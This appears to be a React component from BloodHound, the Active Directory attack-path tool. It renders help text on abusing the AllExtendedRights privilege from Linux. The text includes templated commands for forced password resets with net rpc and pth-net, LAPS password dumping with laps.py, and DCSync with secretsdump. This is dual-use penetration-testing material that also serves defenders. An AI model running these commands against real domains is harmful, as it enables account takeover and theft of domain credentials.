import React from 'react';
import PropTypes from 'prop-types';

const LinuxAbuse = ({ sourceName, sourceType, targetName, targetType, haslaps }) => {
    switch (targetType) {
        case 'User':
            return (
                <>
                    <p>
                        The AllExtendedRights privilege grants {sourceName} the
                        ability to change the password of the user {targetName}{' '}
                        without knowing their current password. This is
                        equivalent to the "ForceChangePassword" edge in
                        BloodHound.
                    </p>

                    <p>
                        Use samba's net tool to change the user's password. The credentials can be supplied in cleartext
                        or prompted interactively if omitted from the command line. The new password will be prompted
                        if omitted from the command line.
                    </p>

                    <pre>
                        <code>
                            {
                                'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                            }
                        </code>
                    </pre>

                    <p>
                        Pass-the-hash can also be done here with <a href='https://github.com/byt3bl33d3r/pth-toolkit'>pth-toolkit's net tool</a>.
                        If the LM hash is not known it must be replace with <code>ffffffffffffffffffffffffffffffff</code>.
                    </p>

                    <pre>
                        <code>
                            {
                                'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                            }
                        </code>
                    </pre>
                </>
            );
        case 'Computer':
            if (haslaps)
                return (
                    <>
                        <p>
                            The AllExtendedRights privilege grants {sourceName} the
                            ability to obtain the RID 500 administrator password of{' '}
                            {targetName}. {sourceName} can do so by listing a
                            computer object's AD properties with PowerView using
                            Get-DomainComputer {targetName}. The value of the
                            ms-mcs-AdmPwd property will contain password of the
                            administrative local account on {targetName}.
                        </p>

                        <p>
                            <a href='https://github.com/n00py/LAPSDumper'>LAPSDumper</a> can be used
                             to retrieve LAPS passwords:
                        </p>

                        <pre>
                            <code>
                                {
                                    'laps.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'
                                }
                            </code>
                        </pre>
                    </>
                );
            else
                return (
                    <p>
                        This ACE is not exploitable under current conditions.
                        Please report this bug to the BloodHound developers
                    </p>
                );
        case 'Domain':
            return (
                <>
                    <h4> DCSync </h4>

                    <p>
                        The AllExtendedRights privilege grants {sourceName} both the
                        DS-Replication-Get-Changes and
                        DS-Replication-Get-Changes-All privileges, which combined
                        allow a principal to replicate objects from the domain{' '}
                        {targetName}.
                    </p>

                    <p>
                        This can be abused using Impacket's secretsdump.py example script:
                    </p>

                    <pre>
                            <code>
                                {
                                    "secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"
                                }
                            </code>
                    </pre>

                    <h4> Retrieve LAPS Passwords </h4>

                    <p>
                        The AllExtendedRights privilege also grants {sourceName} enough{' '}
                        privileges, to retrieve LAPS passwords domain-wise.
                    </p>

                    <p>
                        <a href="https://github.com/n00py/LAPSDumper">LAPSDumper</a> can be used
                         for that purpose:
                    </p>

                    <pre>
                        <code>
                            {
                                'laps.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'
                            }
                        </code>
                    </pre>
                </>
            );
    }
};

LinuxAbuse.propTypes = {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string,
    targetName: PropTypes.string,
    targetType: PropTypes.string,
    haslaps: PropTypes.bool
}

export default LinuxAbuse;
